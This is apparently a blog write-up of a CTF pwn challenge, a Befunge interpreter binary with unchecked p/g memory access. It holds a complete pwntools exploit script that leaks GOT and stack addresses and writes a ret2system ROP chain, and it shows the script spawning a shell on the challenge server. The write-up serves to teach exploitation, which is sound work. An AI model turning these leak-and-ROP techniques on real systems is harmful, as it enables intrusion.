---
layout: post
title: Tokyo Westerns MMA 2016 - Interpreter
category: [Exploitation]
tags: [Exploitation, MMA]
comments: true
---

**Points:** 200
**Solves:** 21
**Category:** Exploitation
**Description:** 

> [befunge]({{site.url}}/assets/befunge)

In this challenge we are given a befunge interpreter. From the [esolangs.org](https://esolangs.org/wiki/Befunge) we learn that `befunge` is an esolang and it's goal is to make compilation of code as difficult as possible. Also, the compile code is placed in a two-dimentional array which is fixed sized called `playfield`. The code dictates the direction of the instruction pointer/program counter in the playfield. An example of an infinite loop would be

{% highlight text %}
>v
^<
{% endhighlight %}

Each of these instructions will just move the instruction pointer to the associated direction looping infinitely.

If we test some example code and paste it in the interpreter it works as expected (with some hiccups, preventing infinite loops).

{% highlight text %}
➜  befunge ./befunge
Welcome to Online Befunge(93) Interpreter
Please input your program.
> 64+"!dlroW ,olleH">:#,_@
>
...
>
Hello, World!
Stack underflow.
{% endhighlight %}

{% highlight text %}
➜  befunge ./befunge
Welcome to Online Befunge(93) Interpreter
Please input your program.
> ^v3:-1$$_,#! #:<\*52",Take one down, pass it around,"*520     <
> ^     >0"elttob erom oN">:#,_$"s"\1-#v_$>0"reeb fo ">:#,_$:2-!|
> >>\:!#^_:.>0"elttob"    ^            >, ^
> ^1:_@#:,,,".":<_v#!-3\*25$_,#! #:<" on the wall"0             <
> ^2:,,","        <
> <v1:*9+29
>
...
>
99 bottles of beer on the wall,
99 bottles of beer,
Take one down, pass it around,
98 bottles of beer on the wall.

98 bottles of beer on the wall,
98 bottles of beer,
Take one down, pass it around,
97 bottles of beer on the wall.

97 bottles of beer on the wall,
97 bottles of beer,
Take one down, pass it around,
96 bottles of beer on the wall.

96 bottles of beer on the wall,
96 bottles of beer,
Take one down, pass it around,
95 bottles of beer on the wall.

95 bottles of beer on the wall,
95 bottles of beer,
Take one down, pass it around,
94 bottles of beer on the wall.

94 bottles of beer on the wall,
94 bottles of beer,
Take one down, pass it around,
93 bottles of beer on the wall.

93 bottles of beer on the wall,
93 bottles of beer,
TToo many steps. Is there any infinite loops?
➜  befunge
{% endhighlight %}



## Main

In the beginning a for loop with fgets reads our input and places it on the .bss in a two dimentional array `program[25][0x50]` meaning we are able to compile code of 2000 characters. A switch/case statement forms a jump table to process the program with each case being a befunge command.

![main]({{site.url}}/assets/Screen Shot 2016-09-05 at 2.20.23 PM.png)

If we reverse the commands we can confirm that each of the commands work as described in [esolangs.org](https://esolangs.org/wiki/Befunge). After reading the commands we go to the case statements for `p` and `g` and we confirm there's no bounds checking from where we can read and write data to. For reading we need 2 values on the stack which act as x and y coordinates from the `program[25][0x50]` program buffer which gets added to the address of the program ptr and gets pushed to the stack, then we can use `,` command for printing it. For writing data we need 3 values on the stack, the two values for x and y coordinates and 3rd value to be written.

![read-write]({{site.url}}/assets/Screen Shot 2016-09-05 at 2.47.49 PM.png)

To push values on the stack I used the `& : Get integer from user and push it` command which in the code uses `scanf("%d", &tmp_int)`. And since the binary is 64bit and scanf takes just a 32bit int we are gonna have to use some additional operations like `+` and `*` (addition and multiplication) to get the desired coordinates.

Now you are thinking, cool, solved, let's move on... Well, not quite :)

{% highlight text %}
➜  befunge checksec befunge
[*] '/vagrant/mma/interpreter/befunge/befunge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
➜  befunge
{% endhighlight %}

With all exploit mitigation enabled, we don't know the address of anything. FULL RELRO prevents us to overwrite the GOT so our only option is overwriting the saved return pointer on the stack. But how do we get the address of the stack ? The program matrix is on the .bss and offsets to the stack vary.

## Exploit

So, to find the address of the saved return pointer we follow these steps:

1. Since the program buffer is on the .bss with the GOT located some negative offset from it we need to leak some entries in the GOT.
2. Leaked some functions we identify the libc version and calculate the libc's base load address.
3. With identified libc version and libc base load address, we calculate the distance to the `__environ` pointer and leak it. This will provide us with the address of the environment variables located on the stack !
4. Calculate the offset from the beginning of the environment variables to the saved return address and write some ROP to do
4.1 `POP RDI`
4.2 `addr of /bin/sh in libc`
4.3 `addr of system in libc`


Fair warning before reading the script, it's very messy but basically the first part is sending the program code and then the second part with a lot of calculations for `x_offset` and `y_offset` to get to the right addresses.

The flow of the program code I used is:

{% highlight text %}
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>v
v<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>v
v<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>v
v<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>>v    
^<<<    # yes infinite loop at the end to ensure we hit the RET branch in main
{% endhighlight %}


{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys


def exploit(r):
    r.recvuntil('> ')
    payload = ('&&g,&&g,&&g,&&g,&&g,&&g,' + '&&g,&&g,&&g,&&g,&&g,&&g,' + '&&g,&&g,&&g,&&g,&&g,&&g,').ljust(0x4f, "A") + 'v'
    r.sendline(payload)

    r.recvuntil('> ')
    payload = (('<&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,').ljust(0x4f, "A")+'v')[::-1]
    r.sendline(payload)

    r.recvuntil('> ')
    payload = ('>&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,').ljust(0x4f, "A") + 'v'
    r.sendline(payload)

    r.recvuntil('> ')
    payload = (('<&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p').ljust(0x4f, "A")+'v')[::-1]
    r.sendline(payload)

    r.recvuntil('> ')
    payload = ('>&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p').ljust(0x4f, "A") + 'v'
    r.sendline(payload)

    r.recvuntil('> ')
    payload = (('<&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p').ljust(0x4f, "A")+'v')[::-1]
    r.sendline(payload)

    r.recvuntil('> ')
    payload = '>v'
    r.sendline(payload)

    r.recvuntil('> ')
    payload = '^<'
    r.sendline(payload)


    for i in range(17):
        r.recvuntil('> ')
        r.send("\n")

    r.sendline('-16')
    r.sendline('-1')
    program_ptr = r.recv(1)
    r.sendline('-15')
    r.sendline('-1')
    program_ptr += r.recv(1)
    r.sendline('-14')
    r.sendline('-1')
    program_ptr += r.recv(1)
    r.sendline('-13')
    r.sendline('-1')
    program_ptr += r.recv(1)
    r.sendline('-12')
    r.sendline('-1')
    program_ptr += r.recv(1)
    r.sendline('-11')
    r.sendline('-1')
    program_ptr += r.recv(1)
    program_ptr += "\x00\x00"
    program_ptr = u64(program_ptr)
    log.info("Program: " + hex(program_ptr))
    r.sendline('-64')
    r.sendline('-1')
    exit_ptr = r.recv(1)
    r.sendline('-63')
    r.sendline('-1')
    exit_ptr += r.recv(1)
    r.sendline('-62')
    r.sendline('-1')
    exit_ptr += r.recv(1)
    r.sendline('-61')
    r.sendline('-1')
    exit_ptr += r.recv(1)
    r.sendline('-60')
    r.sendline('-1')
    exit_ptr += r.recv(1)
    r.sendline('-59')
    r.sendline('-1')
    exit_ptr += r.recv(1)
    exit_ptr += "\x00\x00"
    exit_ptr = u64(exit_ptr)
    log.info("Exit: " + hex(exit_ptr))
    r.sendline('-80')
    r.sendline('-1')
    setvbuf_ptr = r.recv(1)
    r.sendline('-79')
    r.sendline('-1')
    setvbuf_ptr += r.recv(1)
    r.sendline('-78')
    r.sendline('-1')
    setvbuf_ptr += r.recv(1)
    r.sendline('-77')
    r.sendline('-1')
    setvbuf_ptr += r.recv(1)
    r.sendline('-76')
    r.sendline('-1')
    setvbuf_ptr += r.recv(1)
    r.sendline('-75')
    r.sendline('-1')
    setvbuf_ptr += r.recv(1)
    setvbuf_ptr += "\x00\x00"
    setvbuf_ptr = u64(setvbuf_ptr)
    log.info("Setvbuf: " + hex(setvbuf_ptr))
    
    '''
    __environ 00000000003c14a0      local __environ 00000000003c5f98
    exit 000000000003c1e0           local exit 000000000003a020
    setvbuf 00000000000705a0        local setvbuf 000000000006fdb0
    system 0000000000046590         local system 0000000000045380
    offset_str_bin_sh = 0x17c8c3    local offset_str_bin_sh = 0x18c58b
    0x00001273: pop rdi ; ret

    '''
    main_module = program_ptr - 0x202040
    pop_rdi = main_module + 0x1273
    libc_base = exit_ptr - 0x3c1e0
    libc_system = libc_base + 0x46590
    libc_binsh = libc_base + 0x17c8c3
    __environ = libc_base + 0x3c14a0
    offset_y = (__environ - program_ptr) / 0x50
    offset_x = (__environ - program_ptr) % 0x50
    log.info("Libc base: " + hex(libc_base))
    log.info("Main base: " + hex(main_module))
    log.info("POP RDI  : " + hex(pop_rdi))
    log.info("__environ: " + hex(__environ))
    log.info("Offset_y : " + hex(offset_y))
    log.info("Offset_x : " + hex(offset_x))

    r.sendline(str(offset_x))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    stack = r.recv(1)
    r.sendline(str(offset_x+1))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    stack += r.recv(1)
    r.sendline(str(offset_x+2))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    stack += r.recv(1)
    r.sendline(str(offset_x+3))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    stack += r.recv(1)
    r.sendline(str(offset_x+4))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    stack += r.recv(1)
    r.sendline(str(offset_x+5))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    stack += r.recv(1)
    stack += "\x00\x00"
    stack = u64(stack)
    log.info("Stack: " + hex(stack))

    ret_addr = stack - 0xf0 # maybe 0x128
    offset_y = (ret_addr - program_ptr) / 0x50
    offset_x = (ret_addr - program_ptr) % 0x50
    log.info("Offset_y : " + hex(offset_y))
    log.info("Offset_x : " + hex(offset_x))

    r.sendline(str(offset_x))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    ret = r.recv(1)
    r.sendline(str(offset_x+1))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    ret += r.recv(1)
    r.sendline(str(offset_x+2))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    ret += r.recv(1)
    r.sendline(str(offset_x+3))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    ret += r.recv(1)
    r.sendline(str(offset_x+4))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    ret += r.recv(1)
    r.sendline(str(offset_x+5))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    ret += r.recv(1)
    ret += "\x00\x00"
    ret = u64(ret)
    log.info("Ret: " + hex(ret))

    pop_rdi = p64(pop_rdi)
    r.sendline(str(ord(pop_rdi[0])))
    r.sendline(str(offset_x))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(pop_rdi[1])))
    r.sendline(str(offset_x+1))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(pop_rdi[2])))
    r.sendline(str(offset_x+2))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(pop_rdi[3])))
    r.sendline(str(offset_x+3))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(pop_rdi[4])))
    r.sendline(str(offset_x+4))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(pop_rdi[5])))
    r.sendline(str(offset_x+5))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    log.info("Return value overwritten")


    libc_binsh = p64(libc_binsh)
    r.sendline(str(ord(libc_binsh[0])))
    r.sendline(str(offset_x+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(libc_binsh[1])))
    r.sendline(str(offset_x+1+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(libc_binsh[2])))
    r.sendline(str(offset_x+2+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(libc_binsh[3])))
    r.sendline(str(offset_x+3+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(libc_binsh[4])))
    r.sendline(str(offset_x+4+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(libc_binsh[5])))
    r.sendline(str(offset_x+5+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    log.info("Argument ptr to /bin/sh")

    libc_system = p64(libc_system)
    r.sendline(str(ord(libc_system[0])))
    r.sendline(str(offset_x+8+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(libc_system[1])))
    r.sendline(str(offset_x+1+8+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(libc_system[2])))
    r.sendline(str(offset_x+2+8+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(libc_system[3])))
    r.sendline(str(offset_x+3+8+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(libc_system[4])))
    r.sendline(str(offset_x+4+8+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))

    r.sendline(str(ord(libc_system[5])))
    r.sendline(str(offset_x+5+8+8))
    r.sendline(str(offset_y / 0x1000))
    r.sendline(str(0x1000))
    r.sendline(str(offset_y % 0x1000))
    log.info("ret2system")

    r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/mma/interpreter/befunge/befunge'])
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}

{% highlight text %}
  befunge python ./befunge.py pwn1.chal.ctf.westerns.tokyo 62839
[*] For remote: ./befunge.py HOST PORT
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 62839: Done
[*] Program: 0x55dd2af45040
[*] Exit: 0x7fbb797de1e0
[*] Setvbuf: 0x7fbb798125a0
[*] Libc base: 0x7fbb797a2000
[*] Main base: 0x55dd2ad43000
[*] POP RDI  : 0x55dd2ad44273
[*] __environ: 0x7fbb79b634a0
[*] Offset_y : 0x85fa959fa7
[*] Offset_x : 0x30
[*] Stack: 0x7fffc30b4528
[*] Offset_y : 0x86d519e30c
[*] Offset_x : 0x38
[*] Ret: 0x7fbb797c3f45
[*] Return value overwritten
[*] Argument ptr to /bin/sh
[*] ret2system
[*] Switching to interactive mode
Too many steps. Is there any infinite loops?
$ ls
befunge
flag
$ cat flag
TWCTF{It_1s_eMerG3nCy}
Time out
[*] Got EOF while reading in interactive
$
{% endhighlight %}

> P.S. Sorry but the coordinates are switched, `Offset_x` should be the row and `Offset_y` should be the column, in my code they are reversed.

